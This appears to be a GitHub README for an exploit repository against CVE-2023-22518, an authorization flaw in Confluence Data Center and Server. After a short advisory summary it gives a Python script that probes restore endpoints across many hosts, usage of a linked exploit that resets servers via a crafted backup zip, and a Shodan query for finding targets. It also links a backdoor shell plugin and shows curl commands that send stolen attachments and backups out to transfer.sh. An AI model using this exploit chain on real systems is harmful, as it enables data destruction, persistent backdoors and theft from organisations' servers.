# CVE-2023-22518
Improper Authorization Vulnerability in Confluence Data Center and Server.

Atlassian has alerted administrators about a critical vulnerability in Confluence. Exploiting this issue can lead to data loss, so developers urge you to install patches as soon as possible.

It is noted that the vulnerability cannot be used for data leakage, and it does not affect Atlassian Cloud sites accessed through the atlassian.net domain.

https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html

https://jira.atlassian.com/browse/CONFSERVER-93142

| Product              | Affected Versions                | Fixed Versions           |
|----------------------|---------------------------------|--------------------------|
| Confluence Data Center | All versions are affected      | 7.19.16 or later         |
| Confluence Server      |                                | 8.3.4 or later          |
|                       |                                 | 8.4.4 or later          |
|                       |                                 | 8.5.3 or later          |
|                       |                                 | 8.6.1 or later          |

## Exploiting
Class: Improper authorization

CWE: [CWE-285 / CWE-266](https://cwe.mitre.org/data/definitions/285.html)

ATT&CK: [T1548.002](https://attack.mitre.org/techniques/T1548/002/)

## Known attack vectors 🔥
/json/setup-restore.action

/json/setup-restore-local.action

/json/setup-restore-progress.action

/server-info.action [Community Forum](https://community.atlassian.com/t5/Confluence-questions/Is-CVE-2023-22515-also-exploitable-via-server-info-action/qaq-p/2501129)

## A simple example of vulnerability testing in Python

```
import requests
import random
import string
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def post_setup_restore(baseurl):
    paths = ["/json/setup-restore.action", "/json/setup-restore-local.action", "/json/setup-restore-progress.action", "/server-info.action"]
    for path in paths:
        url = f"{baseurl.rstrip('/')}{path}"

        headers = {
            "X-Atlassian-Token": "no-check",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
        }

        rand_str = random_string()
        data = (
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
            "true\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            f"Content-Disposition: form-data; name=\"file\";filename=\"{rand_str}.zip\"\r\n\r\n"
            f"{rand_str}\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
            "Upload and import\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
        )

        try:
            response = requests.post(url, headers=headers, data=data.encode('utf-8'), timeout=10, verify=False)

            if (response.status_code == 200 and
                'The zip file did not contain an entry' in response.text and 
                'exportDescriptor.properties' in response.text):
                print(f"[+] Vulnerable to CVE-2023-22518 on host {url}!")
            else:
                print(f"[-] Not vulnerable to CVE-2023-22518 for host {url}.")
        except requests.RequestException as e:
            print(f"[*] Error connecting to {url}. Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Post setup restore script")
    parser.add_argument('--url', help='The URL to target', required=False)
    parser.add_argument('--file', help='Filename containing a list of URLs', required=False)
    args = parser.parse_args()

    if args.url:
        post_setup_restore(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            for line in f:
                url = line.strip()
                if url:
                    post_setup_restore(url)
    else:
        print("You must provide either --url or --file argument.")

if __name__ == "__main__":
    main()
```

## Use exploit 🔥

[exploit.py](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/exploit.py)
```
python3 exploit.py
Enter the URL: http://REDACTED:8090/json/setup-restore.action?synchronous=true
Enter the path to the .zip file: /path/xmlexport-20231109-060519-1.zip
```

## Bonus 🔥

Shodan search:
```
http.favicon.hash:-305179312
```

[exploit-restore.zip](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/xmlexport-20231109-060519-1.zip)

[Confluence Backdoor Shell App](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/atlplug.jar)

When resetting Confluence using this vulnerability, the directory %CONFLUENCE_HOME%/attachments remains full of files, potentially numbering in the thousands. Extracting them all is quite straightforward, and their extensions can be determined using the Linux file command. For example:
```
file /var/lib/confluence/attachments/v4/191/28/77273124/77273124.1
/var/lib/confluence/attachments/v4/191/28/77273124/77273124.1: PNG image data, 442 x 170, 8-bit/color RGBA, non-interlaced

or

file /var/atlassian/application-data/confluence/attachments/v4/114/128/3506237/3506237.1
/var/atlassian/application-data/confluence/attachments/v4/114/128/3506237/3506237.1: PNG image data, 1250 x 674, 8-bit/color RGBA, non-interlaced
```

Example of how to easily archive a directory and extract the archive:
```
tar -czvf /var/atlassian/application-data/confluence/attachments_backup.tar.gz /var/atlassian/application-data/confluence/attachments
curl --upload-file /var/atlassian/application-data/attachments_backup.tar.gz https://transfer.sh/attachments_backup.tar.gz
https://transfer.sh/***********/attachments_backup.tar.gz

or

curl --upload-file /var/atlassian/application-data/confluence/backups/backup-2023_09_26.zip https://transfer.sh/backup-2023_09_26.zip
https://transfer.sh/***********/backup-2023_09_26.zip
```
[Novel backdoor persists even after critical Confluence vulnerability is patched](https://www.theregister.com/2023/11/14/novel_backdoor_persists_confluence/)

##

[More useful information](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/DETAIL.md)
